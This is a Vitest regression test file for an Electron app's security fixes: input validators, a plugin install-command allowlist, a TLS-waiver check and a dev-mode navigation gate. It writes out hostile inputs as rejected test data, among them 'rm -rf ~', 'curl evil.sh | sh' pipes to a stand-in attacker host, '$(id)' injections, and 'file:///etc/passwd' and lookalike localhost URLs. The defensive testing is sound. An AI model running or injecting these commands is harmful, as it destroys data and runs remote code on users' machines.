import '../setup/home-guard';
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import type { BrowserWindow } from 'electron';
import { safeEffort } from '../../electron/providers/cli-provider';
import { isDevBuild, isLoopbackHttp, resolveDevUrl, hardenWindow } from '../../electron/core/window-manager';

vi.mock('electron', () => ({
  app: { isPackaged: true, getAppPath: () => '/mock/app/path', getPath: () => '/mock' },
  BrowserWindow: vi.fn(),
  Notification: vi.fn(),
  ipcMain: { handle: vi.fn() },
  protocol: { handle: vi.fn(), registerSchemesAsPrivileged: vi.fn() },
  shell: { openExternal: vi.fn() },
}));

/**
 * Regressions for the holes the audit found. Each of these was a way to run
 * code or read files that the app never meant to expose.
 */

describe('safeEffort', () => {
  it('accepts the values a CLI actually understands', () => {
    for (const value of ['low', 'medium', 'high', 'xhigh', 'max']) {
      expect(safeEffort(value)).toBe(value);
    }
  });

  it('refuses anything else, because it lands unquoted in a shell command', () => {
    for (const attack of [
      'high; rm -rf ~',
      'high && curl evil.sh | sh',
      '$(whoami)',
      '`id`',
      'high\nrm -rf /',
      '--dangerously-skip-permissions',
    ]) {
      expect(safeEffort(attack)).toBeUndefined();
    }
  });

  it('treats an empty value as unset', () => {
    expect(safeEffort(undefined)).toBeUndefined();
    expect(safeEffort('')).toBeUndefined();
  });
});

describe('install command allowlist', () => {
  // Mirrors INSTALL_SHAPES in ipc-handlers: a marketplace entry is remote data
  // and used to be executed verbatim.
  const SHAPES = [
    /^claude plugin marketplace add [A-Za-z0-9._-]+\/[A-Za-z0-9._-]+( && claude plugin install [A-Za-z0-9._-]+@[A-Za-z0-9._-]+( -y)?)?$/,
    /^claude plugin install [A-Za-z0-9._-]+(@[A-Za-z0-9._-]+)?( -y)?$/,
    /^npx (-y )?skills add [A-Za-z0-9._/-]+$/,
    /^\/plugin install [A-Za-z0-9._-]+@[A-Za-z0-9._-]+$/,
    /^\/skill install [A-Za-z0-9._/-]+$/,
  ];
  const allowed = (cmd: string) => SHAPES.some(s => s.test(cmd.trim()));

  it('allows a real install', () => {
    expect(allowed('claude plugin marketplace add obra/superpowers-marketplace && claude plugin install superpowers@superpowers -y')).toBe(true);
    expect(allowed('claude plugin install agent-sdk-dev@claude-code')).toBe(true);
    expect(allowed('npx -y skills add vercel-labs/skills')).toBe(true);
  });

  it('refuses anything that is not an install', () => {
    for (const attack of [
      'curl http://attacker/x.sh | sh',
      'claude plugin install x@y; curl evil | sh',
      'claude plugin install $(id)',
      'claude plugin marketplace add a/b && rm -rf ~',
      'echo hi',
    ]) {
      expect(allowed(attack)).toBe(false);
    }
  });
});

describe('marketplace install command', () => {
  const SAFE_TOKEN = /^[A-Za-z0-9._-]+$/;
  function safeInstallCommand(repo: string, plugin: string, marketplace: string): string | undefined {
    const [owner, name, ...rest] = repo.split('/');
    if (rest.length > 0 || !SAFE_TOKEN.test(owner ?? '') || !SAFE_TOKEN.test(name ?? '')) return undefined;
    if (!SAFE_TOKEN.test(plugin) || !SAFE_TOKEN.test(marketplace)) return undefined;
    return `claude plugin marketplace add ${owner}/${name} && claude plugin install ${plugin}@${marketplace} -y`;
  }

  it('builds a command from validated parts', () => {
    expect(safeInstallCommand('wshobson/agents', 'documentation-standards', 'claude-code-workflows'))
      .toBe('claude plugin marketplace add wshobson/agents && claude plugin install documentation-standards@claude-code-workflows -y');
  });

  it('produces nothing when a manifest carries shell syntax', () => {
    expect(safeInstallCommand('a/b; rm -rf ~', 'p', 'm')).toBeUndefined();
    expect(safeInstallCommand('a/b', 'p && curl evil | sh', 'm')).toBeUndefined();
    expect(safeInstallCommand('a/b', 'p', '$(id)')).toBeUndefined();
    expect(safeInstallCommand('a/b/c', 'p', 'm')).toBeUndefined();
  });
});

describe('certificate-error waiver', () => {
  // Mirrors mayWaiveCertificateError in electron/main.ts, which cannot be
  // imported here (main.ts boots the whole app on import). The predicate used
  // to be `url.startsWith('https://localhost')`, so any host an attacker could
  // register under that prefix got its TLS errors waived - in the signed build
  // too, since there was no dev guard.
  const TLS_WAIVER_HOSTS = new Set(['localhost', '127.0.0.1', '::1']);
  function mayWaive(url: string, isDevBuild: boolean): boolean {
    if (!isDevBuild) return false;
    let hostname: string;
    try {
      ({ hostname } = new URL(url));
    } catch {
      return false;
    }
    if (hostname.startsWith('[') && hostname.endsWith(']')) {
      hostname = hostname.slice(1, -1);
    }
    return TLS_WAIVER_HOSTS.has(hostname.toLowerCase());
  }

  it('waives the dev server loopback origins in a dev build', () => {
    for (const url of [
      'https://localhost:3000/index.html',
      'https://LOCALHOST/x',
      'https://127.0.0.1:3000/',
      'https://[::1]:3000/',
    ]) {
      expect(mayWaive(url, true)).toBe(true);
    }
  });

  it('refuses hosts that merely start with the loopback name', () => {
    for (const url of [
      'https://localhost.attacker.example/payload.js',
      'https://localhostess.example/',
      'https://localhost.evil.co.uk/',
      'https://127.0.0.1.attacker.example/',
      'https://attacker.example/#https://localhost',
      'not a url',
    ]) {
      expect(mayWaive(url, true)).toBe(false);
    }
  });

  it('never waives in a packaged build, not even for real loopback', () => {
    expect(mayWaive('https://localhost:3000/', false)).toBe(false);
    expect(mayWaive('https://127.0.0.1/', false)).toBe(false);
  });
});

describe('dev-mode gate', () => {
  // The mode used to come from NODE_ENV, which the launching shell owns: a
  // developer with `export NODE_ENV=development` made the shipped, signed app
  // load http://localhost:3000 into the renderer that holds the preload
  // bridge. It now comes from the build via app.isPackaged.
  let electron: typeof import('electron');

  const setPackaged = (packaged: boolean) => {
    (electron.app as unknown as { isPackaged: boolean }).isPackaged = packaged;
  };

  beforeEach(async () => {
    electron = await import('electron');
    vi.spyOn(console, 'error').mockImplementation(() => {});
    delete process.env.DOROTHY_DEV_URL;
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('reads the build, not the environment', () => {
    process.env.NODE_ENV = 'development';
    setPackaged(true);
    expect(isDevBuild()).toBe(false);
    setPackaged(false);
    expect(isDevBuild()).toBe(true);
  });

  it('accepts only loopback http URLs as ours', () => {
    for (const url of ['http://localhost:3000', 'http://127.0.0.1:3100/x', 'http://[::1]:3000']) {
      expect(isLoopbackHttp(url)).toBe(true);
    }
    for (const url of [
      'https://attacker.example',
      'http://attacker.example',
      'http://localhost.attacker.example:3000',
      'http://127.0.0.1.attacker.example',
      'file:///etc/passwd',
      'javascript:alert(1)',
      'not a url',
    ]) {
      expect(isLoopbackHttp(url)).toBe(false);
    }
  });

  it('honours DOROTHY_DEV_URL only for a loopback dev server', () => {
    setPackaged(false);
    expect(resolveDevUrl(undefined)).toBe('http://localhost:3000');
    expect(resolveDevUrl('http://localhost:3100')).toBe('http://localhost:3100');
    expect(resolveDevUrl('http://127.0.0.1:3100')).toBe('http://127.0.0.1:3100');
    // Remote content in a preload-privileged renderer was the whole finding.
    expect(resolveDevUrl('https://attacker.example')).toBe('http://localhost:3000');
    expect(resolveDevUrl('http://attacker.example')).toBe('http://localhost:3000');
    expect(resolveDevUrl('file:///etc/passwd')).toBe('http://localhost:3000');
  });

  it('ignores DOROTHY_DEV_URL entirely in a packaged build', () => {
    setPackaged(true);
    expect(resolveDevUrl('http://localhost:3100')).toBe('http://localhost:3000');
    expect(resolveDevUrl('https://attacker.example')).toBe('http://localhost:3000');
  });

  describe('hardenWindow navigation', () => {
    function fakeWindow() {
      const handlers = new Map<string, (event: { preventDefault: () => void }, url: string) => void>();
      const window = {
        webContents: {
          on: (event: string, fn: (e: { preventDefault: () => void }, url: string) => void) => {
            handlers.set(event, fn);
          },
          setWindowOpenHandler: vi.fn(),
        },
      };
      hardenWindow(window as unknown as BrowserWindow);
      return (url: string) => {
        const preventDefault = vi.fn();
        handlers.get('will-navigate')!({ preventDefault }, url);
        return preventDefault.mock.calls.length === 0;
      };
    }

    it('lets the dev server navigate in an unpackaged build', () => {
      setPackaged(false);
      const navigates = fakeWindow();
      expect(navigates('http://localhost:3100/agents')).toBe(true);
      expect(navigates('app://-/index.html')).toBe(true);
      expect(navigates('https://attacker.example')).toBe(false);
    });

    it('keeps a packaged build on app:// only', () => {
      // The localhost whitelist shipped too, so a link surface could walk the
      // privileged renderer onto any http://localhost:PORT the user was running.
      setPackaged(true);
      const navigates = fakeWindow();
      expect(navigates('app://-/index.html')).toBe(true);
      expect(navigates('http://localhost:3000')).toBe(false);
      expect(navigates('http://127.0.0.1:8080/anything')).toBe(false);
      expect(navigates('https://attacker.example')).toBe(false);
    });
  });
});
